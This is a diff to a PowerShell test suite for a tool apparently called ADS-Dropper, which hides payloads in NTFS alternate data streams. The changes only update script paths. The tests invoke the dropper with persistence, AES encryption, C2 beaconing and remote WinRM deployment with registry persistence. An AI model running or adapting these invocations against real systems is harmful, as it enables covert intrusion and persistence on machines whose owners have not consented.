@@ -68,7 +68,7 @@ function Test-LocalDeployment {
     param($Persist, $Encrypt)
     Write-Host "`n[1/5] Local: $($Persist -join ',') $(if($Encrypt){'[AES]'} else {'[Plain]'})" -ForegroundColor Yellow
     
-    & "$scriptPath\ADS-Dropper.ps1" -Payload $beaconPayload -Persist $Persist -Encrypt:$Encrypt -Randomize -NoExec
+    & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Persist $Persist -Encrypt:$Encrypt -Randomize -NoExec
     $ads = Get-ChildItem $testDir -Recurse -Filter "*:*" | Where-Object Length -gt 0
     if($ads.Count -eq 0) { throw "No ADS created" }
     
@@ -83,10 +83,10 @@ function Test-LocalDeployment {
 }
 
 function Test-Beaconing {
-    Write-Host "`n[2/5] C2 Beaconing → $BeaconTarget" -ForegroundColor Yellow
+    Write-Host "`n[2/5] C2 Beaconing -> $BeaconTarget" -ForegroundColor Yellow
     
     Start-BeaconListener
-    Start-Job { & "$using:scriptPath\ADS-Dropper.ps1" -Payload $using:beaconPayload -Persist @() } | Wait-Job -Timeout $BeaconTimeout
+    Start-Job { & "$using:scriptPath\src\ADS-Dropper.ps1" -Payload $using:beaconPayload -Persist @() } | Wait-Job -Timeout $BeaconTimeout
     
     $hits = Get-Content $beaconLog -ErrorAction SilentlyContinue
     Get-Job | Stop-Job | Remove-Job
@@ -101,7 +101,7 @@ function Test-Beaconing {
 
 function Test-Encryption {
     Write-Host "`n[3/5] AES Encryption" -ForegroundColor Yellow
-    & "$scriptPath\ADS-Dropper.ps1" -Payload $beaconPayload -Persist @() -Encrypt -Randomize -NoExec
+    & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Persist @() -Encrypt -Randomize -NoExec
     $ads = Get-ChildItem $testDir -Recurse -Filter "*:*" | Select-Object -First 1
     if($ads.Length -eq 0 -or !(Get-Content $ads.FullName -Raw -match '^[A-Za-z0-9+/=]+$')) {
         throw "Encryption failed"
@@ -111,16 +111,16 @@ function Test-Encryption {
 
 function Test-Execution {
     Write-Host "`n[4/5] Execution" -ForegroundColor Yellow
-    Start-Job { & "$using:scriptPath\ADS-Dropper.ps1" -Payload 'Write-Host "EXE"' -Persist @() } | Wait-Job
+    Start-Job { & "$using:scriptPath\src\ADS-Dropper.ps1" -Payload 'Write-Host "EXE"' -Persist @() } | Wait-Job
     Write-Host "PASS" -ForegroundColor Green
 }
 
 function Test-Remote {
     param($Target = 'localhost')
-    Write-Host "`n[5/5] Remote → $Target" -ForegroundColor Yellow
+    Write-Host "`n[5/5] Remote -> $Target" -ForegroundColor Yellow
     
     if($Target -eq 'localhost' -or (Test-WSMan $Target -ErrorAction SilentlyContinue)) {
-        & "$scriptPath\ADS-Dropper.ps1" -Payload $beaconPayload -Targets $Target -Persist @('reg') -NoExec
+        & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Targets $Target -Persist @('reg') -NoExec
         Write-Host "PASS" -ForegroundColor Green
     } else {
         Write-Warning "WinRM unavailable - skipping"
